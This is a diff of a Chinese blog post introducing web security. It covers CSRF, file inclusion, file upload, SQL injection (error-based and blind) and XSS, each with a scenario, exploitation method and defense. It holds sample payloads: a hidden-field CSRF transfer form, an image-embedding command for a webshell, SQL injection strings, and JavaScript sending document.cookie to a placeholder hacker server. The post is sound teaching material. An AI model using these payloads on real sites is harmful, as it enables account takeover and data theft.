+<h6 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"转账的URL"</span> <span class="attr">method</span>=<span class="string">'XX'</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'username'</span> <span class="attr">value</span>=<span class="string">'hacker'</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'money'</span> <span class="attr">value</span>=<span class="string">'10000'</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submie"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
+<h6 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;添加csrf_token、加用户表示确认的信息（验证码、密码）</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h6 id="场景-3"><a href="#场景-3" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;程序员在编写PHP服务端代码时，为了代码复用，将公用代码写成另一个文件，然后include进需要使用的代码。如果用户能控制include  的参数，则会产生文件包含漏洞</p>
+<h6 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h6><p>&ensp;&ensp;&ensp;&ensp;include 的参数可控,且PHP开启allow_url_include，则我们可以让被攻击的Web服务器执行webshell（注意：文件名以txt结尾，如果是服务端脚本文件的话，则脚本会在我们的服务器上执行，否则在被攻击服务器上执行），如果不能进行url包含，则我们可以结合文件上传漏洞执行webshell。</p>
+<h6 id="防御方法-3"><a href="#防御方法-3" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;关闭远程url包含，且include的参数设置用白名单。</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h6 id="场景-4"><a href="#场景-4" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;网站有上传文件的功能，如果没做好相应的防范措施，则我们可以上传webshell</p>
+<h6 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h6><p>&ensp;&ensp;&ensp;&ensp;如果没有限制上传文件的格式，则我们直接上传webshell。如果服务器检查了文件的格式，则我们可以抓包，然后修改数据包中，文件格式为合法格式。如果服务器对上传的文件进行了内容检查，则我们可以 copy test.img/b + test.txt/a test1.img 生成一个包含代码的图片上传，然后利用文件包含漏洞执行webshell</p>
+<h6 id="防御方法-4"><a href="#防御方法-4" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;对上传的文件进行相应的编码，不给与执行权限</p>
+<h3 id="SQL回显注入"><a href="#SQL回显注入" class="headerlink" title="SQL回显注入"></a>SQL回显注入</h3><h6 id="场景-5"><a href="#场景-5" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;Web服务器将sql执行的结果返回给用户（包括sql执行的错误信息）。且没有对用户输入的数据进行相应的处理，直接构造动态sql。则多半会存在SQL回显注入。则用户可以构造恶意数据，获得数据库中的信息。</p>
+<h6 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h6><p>&ensp;&ensp;&ensp;&ensp;由于服务器会显示SQL执行的结果（包括sql执行的错误信息），则我们可以利用order by  与 union select 猜解字段数，利用  select user(),database() 获得当先用户名与数据库名， 然后通过<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'database name'</span></div></pre></td></tr></table></figure></p>
+<p>获得表名</p>
+<p>通过<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'table name'</span></div></pre></td></tr></table></figure></p>
+<p>获得字段名<br>得到表名与字段名之后，我们就可以查询数据库中的信息了。</p>
+<h6 id="防御方法-5"><a href="#防御方法-5" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;严格限制用户的输入，在服务端进行检查，比如我们想获得一个类型为数字的id，则我们最好在服务端进行判断是否为数字，防止用户提交恶意的数据。</p>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><h6 id="场景-6"><a href="#场景-6" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;用户向Web服务器提交查询，服务器只会返回‘真’或‘假’，且web服务器为对用户输入的数据没有进行检查，动态构造sql语句，则多半会存在SQL盲注。则用户可以构造恶意数据，获得数据库中的信息。</p>
+<h6 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h6><p>&ensp;&ensp;&ensp;&ensp;由于服务器只会返回真或假，则我们可以利用 length,substr,ascii,sleep 函数获得用户名，数据库名，表名，字段名，表中对应的数据。<br>如服务器如下代码构造sql语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$id = $_GET(<span class="string">'id'</span>);</div><div class="line">$sql = <span class="string">'select * from test where id = '</span>$id<span class="string">''</span>;</div></pre></td></tr></table></figure></p>
+<p>则我们可以这样提交id: 1’ and 这里为你想执行的sql – ‘<br>获得数据库名字的方法输入<br>1’ and ascii(substr(database(),1,1)) = 65 – ‘<br>这里我们猜数据库名的第一个字符为65.如果服务器中确实存在id为1的数据，则如果我们猜测数据库的第一个字符为65则返回真，否则返回假。一直猜下去就会得到数据库名。</p>
+<h6 id="防御方法-6"><a href="#防御方法-6" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;严格限制用户的输入，在服务端进行检查，比如我们想获得一个类型为数字的id，则我们最好在服务端进行判断是否为数字，防止用户提交恶意的数据。</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h6 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h6><p>&ensp;&ensp;&ensp;&ensp;XSS分存储型XSS，反射型XSS，DOM型XSS。存储型XSS，反射型XSS的区别是前一个恶意代码在数据库中，后一个在url中，相同点是输出都在HTTP响应中。反射型XSS，DOM型XSS的区别是一个输出在HTTP响应中，一个在DOM结点中， 相同点是：恶意代码都在URL中。</p>
+<h6 id="场景-7"><a href="#场景-7" class="headerlink" title="场景"></a>场景</h6><p>&ensp;&ensp;&ensp;&ensp;一个网站中，存在用户A与用户B，用户B构造XSS攻击，发送网址给用户A，用户A单击后，用户B就能以用户A的身份登陆网站。</p>
+<h6 id="利用方法-7"><a href="#利用方法-7" class="headerlink" title="利用方法"></a>利用方法</h6><p><code>&lt;script&gt;恶意代码&lt;/script&gt;，或&lt;img src=x onerror=&quot;恶意代码&quot;&gt;</code></p>
+<p>获取cookie的方法为，黑客架设一个web服务器接受cookie，恶意代码为:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.open(<span class="string">'黑客服务器?cookie='</span>+<span class="built_in">document</span>.cookie);</div><div class="line"><span class="comment">//或</span></div><div class="line"><span class="built_in">document</span>.location=<span class="string">'黑客服务器?cookie='</span>+<span class="built_in">document</span>.cookie;</div></pre></td></tr></table></figure>
+<h6 id="防御方法-7"><a href="#防御方法-7" class="headerlink" title="防御方法"></a>防御方法</h6><p>&ensp;&ensp;&ensp;&ensp;对特殊字符进行编码（htmlspecialchars函数）</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&ensp;&ensp;&ensp;&ensp;永远不要相信用户的输入，一定要进行合法性验证。且使用白名单而不是黑名单。</p>
 
         
     
@@ -522,8 +541,8 @@
     <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://www.0xkernel.com/2017/09/29/风际游戏-服务端开发面试/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://www.0xkernel.com/2017/11/17/Web安全入门/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://www.0xkernel.com/2017/11/17/Web安全入门/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 <script type="text/ls-javascript" id="disqus-thread-script">
@@ -553,19 +572,19 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2017/10/09/Distributed-System-Intruduction/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
+    
+        <a href="/2017/10/10/Linux-2-6-24内核编译中遇到的坑/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
     
 </nav>
 
